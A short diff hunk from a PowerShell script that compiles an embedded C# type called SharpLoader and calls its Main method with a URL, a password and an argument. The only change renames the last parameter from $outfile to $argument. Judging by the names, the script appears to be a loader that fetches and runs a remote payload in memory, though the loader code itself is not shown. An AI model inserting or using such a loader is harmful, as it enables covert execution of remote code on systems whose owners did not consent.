@@ -240,6 +240,6 @@ namespace SharpLoader
 
 Add-Type -TypeDefinition $sharploader
 
-[SharpLoader.Program]::Main("$url","$password","$outfile")
+[SharpLoader.Program]::Main("$url","$password","$argument")
 
 }
